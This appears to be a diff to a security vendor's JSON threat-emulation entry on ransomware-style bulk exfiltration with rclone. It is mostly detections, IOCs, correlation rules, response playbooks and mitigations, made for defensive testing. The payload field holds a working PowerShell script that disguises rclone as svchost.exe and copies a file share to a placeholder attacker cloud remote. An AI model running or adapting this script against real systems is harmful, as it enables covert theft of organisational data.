@@ -47,7 +47,7 @@
   },
   "identity": {
     "name": "Bulk Data Exfiltration via Rclone to Cloud Storage (T1567.002)",
-    "summary": "An attacker with file-server access uses rclone \u2014 a legitimate cloud-sync utility \u2014 to push hundreds of GB to attacker-controlled cloud storage (MEGA, B2, S3). The traffic blends with sanctioned cloud sync, defeats signature egress controls, and completes in under an hour on modern uplinks.",
+    "summary": "An attacker with file-server access uses rclone — a legitimate cloud-sync utility — to push hundreds of GB to attacker-controlled cloud storage (MEGA, B2, S3). The traffic blends with sanctioned cloud sync, defeats signature egress controls, and completes in under an hour on modern uplinks.",
     "description": "Rclone is the de facto exfiltration tool of the modern ransomware operator. Unit 42's BlackSuit Blitz reporting describes exfiltration of over 400 GB before encryption. The DFIR Report, Mandiant, and CrowdStrike have all documented rclone in Black Basta, BlackSuit, Akira, and Lockbit affiliate playbooks. Detection hinges on (a) the rclone binary itself (renamed often), (b) characteristic configuration patterns (`--multi-thread-streams`, `--transfers`, `--config`), and (c) sustained outbound throughput to non-corporate cloud endpoints. This TTP chains downstream of TTP-2026-0004 (DCSync provides the credentials to access file servers) and upstream of TTP-2026-0006 (post-exfil mass encryption).",
     "severity": "critical",
     "confidence": "high"
@@ -146,7 +146,7 @@
     ],
     "payload": {
       "interpreter": "powershell",
-      "code": "# Stage 1 \u2014 Drop rclone binary (often renamed by attackers). Lab uses canonical name.\n$rclone = \"C:\\Users\\Public\\Music\\svchost.exe\"  # masquerade pattern\nInvoke-WebRequest -Uri \"https://downloads.rclone.org/v1.66.0/rclone-v1.66.0-windows-amd64.zip\" -OutFile \"$env:TEMP\\r.zip\"\nExpand-Archive -Path \"$env:TEMP\\r.zip\" -DestinationPath \"$env:TEMP\\r\" -Force\nCopy-Item -Path (Get-ChildItem \"$env:TEMP\\r\" -Recurse -Filter rclone.exe).FullName -Destination $rclone -Force\n\n# Stage 2 \u2014 Write minimal config inline (avoids interactive setup).\n$cfg = @\"\n[${POV_REMOTE_NAME}]\ntype = ${POV_REMOTE_TYPE}\naccess_key_id = ${POV_REMOTE_KEY_ID}\nsecret_access_key = ${POV_REMOTE_KEY_SECRET}\nendpoint = ${POV_REMOTE_ENDPOINT}\nregion = ${POV_REMOTE_REGION}\n\"@\n$cfgPath = \"$env:TEMP\\rcfg.conf\"\nSet-Content -Path $cfgPath -Value $cfg -Encoding ASCII\n\n# Stage 3 \u2014 Sync 'sensitive' lab data to attacker remote with high concurrency.\n& $rclone copy \"C:\\lab-shares\\finance\" \"${POV_REMOTE_NAME}:${POV_REMOTE_BUCKET}/pov-${POV_RUN_ID}/\" `\n  --config $cfgPath `\n  --transfers 32 `\n  --multi-thread-streams 8 `\n  --checkers 16 `\n  --no-traverse `\n  --log-level INFO `\n  --stats 10s `\n  --use-mmap",
+      "code": "# Stage 1 — Drop rclone binary (often renamed by attackers). Lab uses canonical name.\n$rclone = \"C:\\Users\\Public\\Music\\svchost.exe\"  # masquerade pattern\nInvoke-WebRequest -Uri \"https://downloads.rclone.org/v1.66.0/rclone-v1.66.0-windows-amd64.zip\" -OutFile \"$env:TEMP\\r.zip\"\nExpand-Archive -Path \"$env:TEMP\\r.zip\" -DestinationPath \"$env:TEMP\\r\" -Force\nCopy-Item -Path (Get-ChildItem \"$env:TEMP\\r\" -Recurse -Filter rclone.exe).FullName -Destination $rclone -Force\n\n# Stage 2 — Write minimal config inline (avoids interactive setup).\n$cfg = @\"\n[${POV_REMOTE_NAME}]\ntype = ${POV_REMOTE_TYPE}\naccess_key_id = ${POV_REMOTE_KEY_ID}\nsecret_access_key = ${POV_REMOTE_KEY_SECRET}\nendpoint = ${POV_REMOTE_ENDPOINT}\nregion = ${POV_REMOTE_REGION}\n\"@\n$cfgPath = \"$env:TEMP\\rcfg.conf\"\nSet-Content -Path $cfgPath -Value $cfg -Encoding ASCII\n\n# Stage 3 — Sync 'sensitive' lab data to attacker remote with high concurrency.\n& $rclone copy \"C:\\lab-shares\\finance\" \"${POV_REMOTE_NAME}:${POV_REMOTE_BUCKET}/pov-${POV_RUN_ID}/\" `\n  --config $cfgPath `\n  --transfers 32 `\n  --multi-thread-streams 8 `\n  --checkers 16 `\n  --no-traverse `\n  --log-level INFO `\n  --stats 10s `\n  --use-mmap",
       "input_variables": [
         {
           "name": "POV_REMOTE_NAME",
@@ -223,12 +223,12 @@
       {
         "ioc_type": "filename",
         "value": "rclone.exe",
-        "context": "Canonical binary name; attackers commonly rename \u2014 match on file hash and process behavior, not name alone."
+        "context": "Canonical binary name; attackers commonly rename — match on file hash and process behavior, not name alone."
       },
       {
         "ioc_type": "domain",
         "value": "*.mega.nz",
-        "context": "Common attacker-controlled destination; not malicious on its own \u2014 flag in combination with rclone behavior."
+        "context": "Common attacker-controlled destination; not malicious on its own — flag in combination with rclone behavior."
       }
     ],
     "biocs": [
@@ -283,15 +283,15 @@
     ],
     "correlation_rules": [
       {
-        "name": "Exfiltration \u2014 Rclone-Pattern Tool + Large Egress to Non-Corp ASN",
+        "name": "Exfiltration — Rclone-Pattern Tool + Large Egress to Non-Corp ASN",
         "rule_id": "CR-EXFIL-0001",
         "logic": "BIOC(Rclone Command-Line Flag Pattern) AND BIOC(Large Sustained Egress From File Server to Non-Corporate Cloud Provider) on same host within 30m"
       }
     ],
     "analytics_modules": [
       "Cortex XDR Data Exfiltration Detection",
-      "Advanced DNS Security \u2014 abnormal-destination domain category",
-      "NGFW App-ID \u2014 rclone signature (where available)"
+      "Advanced DNS Security — abnormal-destination domain category",
+      "NGFW App-ID — rclone signature (where available)"
     ]
   },
   "panw_mapping": {
@@ -359,17 +359,17 @@
           "XSOAR-PB-ExfiltrationResponse-v2"
         ],
         "license_required": "base",
-        "evidence_query": "Playbook: Exfiltration Response \u2014 isolate host, block dst ASN at NGFW, snapshot file-server access logs, page DFIR."
+        "evidence_query": "Playbook: Exfiltration Response — isolate host, block dst ASN at NGFW, snapshot file-server access logs, page DFIR."
       }
     ],
-    "use_cases": [
+    "threat_scenarios": [
       {
-        "use_case_id": "UC-EXFIL-001",
-        "name": "Double-Extortion Defense \u2014 Pre-Encryption Exfiltration Detection",
+        "threat_scenario_id": "TS-EXFIL-001",
+        "name": "Double-Extortion Defense — Pre-Encryption Exfiltration Detection",
         "description": "Detect and disrupt large-volume cloud-storage exfiltration before encryption begins (the modern ransomware playbook stages exfil first).",
-        "test_cases": [
+        "threat_steps": [
           {
-            "test_case_id": "TC-EXFIL-001A",
+            "threat_step_id": "TS-EXFIL-001A",
             "objective": "Cortex XDR BIOC `Rclone Command-Line Flag Pattern` fires on rclone-style process exec regardless of binary name.",
             "preconditions": [
               "Lab host with Cortex XDR agent.",
@@ -383,12 +383,12 @@
             "success_criteria": [
               "BIOC fires within 30s of process exec.",
               "Alert references both flag-pattern and binary masquerade.",
-              "XQL validation returns \u22651 row."
+              "XQL validation returns ≥1 row."
             ],
             "expected_score_weight": 0.3
           },
           {
-            "test_case_id": "TC-EXFIL-001B",
+            "threat_step_id": "TS-EXFIL-001B",
             "objective": "NGFW + Advanced DNS Security block or alert on the egress before transfer completes.",
             "preconditions": [
               "Lab firewall in path of exfil traffic; storage-services DNS category set to alert/block."
@@ -401,17 +401,17 @@
             "expected_score_weight": 0.3
           },
           {
-            "test_case_id": "TC-EXFIL-001C",
+            "threat_step_id": "TS-EXFIL-001C",
             "objective": "XSIAM correlation rule fuses XDR + NGFW + DNS signals into one incident.",
             "success_criteria": [
               "Single incident with three contributing alerts.",
-              "Incident timeline shows process \u2192 DNS \u2192 flow in order.",
+              "Incident timeline shows process → DNS → flow in order.",
               "Correlation `CR-EXFIL-0001` named in the incident."
             ],
             "expected_score_weight": 0.2
           },
           {
-            "test_case_id": "TC-EXFIL-001D",
+            "threat_step_id": "TS-EXFIL-001D",
             "objective": "XSOAR auto-response isolates the host and blocks the destination ASN.",
             "success_criteria": [
               "Playbook `XSOAR-PB-ExfiltrationResponse-v2` invoked.",
@@ -429,7 +429,7 @@
       "Application allow-listing on file servers and Tier 0/1 hosts; deny unsigned binaries.",
       "NGFW URL category `storage-services` set to alert/block for subnets that don't need access.",
       "DLP policies on egress for confidential content classifications.",
-      "Egress flow accounting \u2014 alert any host crossing N GB/hour outbound."
+      "Egress flow accounting — alert any host crossing N GB/hour outbound."
     ],
     "detection_engineering": [
       "Build a baseline of normal egress per host and per ASN; alert on top-1% anomalies.",
@@ -447,7 +447,7 @@
       "primary": true
     },
     {
-      "title": "MITRE ATT&CK T1567.002 \u2014 Exfiltration to Cloud Storage",
+      "title": "MITRE ATT&CK T1567.002 — Exfiltration to Cloud Storage",
       "url": "https://attack.mitre.org/techniques/T1567/002/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
@@ -459,7 +459,7 @@
       "publisher_id": "SRC-RCLONE-DOCS"
     },
     {
-      "title": "The DFIR Report \u2014 Rclone exfiltration case studies",
+      "title": "The DFIR Report — Rclone exfiltration case studies",
       "url": "https://thedfirreport.com/?s=rclone",
       "publisher": "The DFIR Report",
       "publisher_id": "SRC-DFIR-REPORT"
@@ -470,7 +470,7 @@
       "entry_version": "1.0.0",
       "date": "2026-05-13",
       "author": "Henry Reed",
-      "change": "Initial entry \u2014 BlackSuit Blitz decomposition."
+      "change": "Initial entry — BlackSuit Blitz decomposition."
     }
   ]
 }
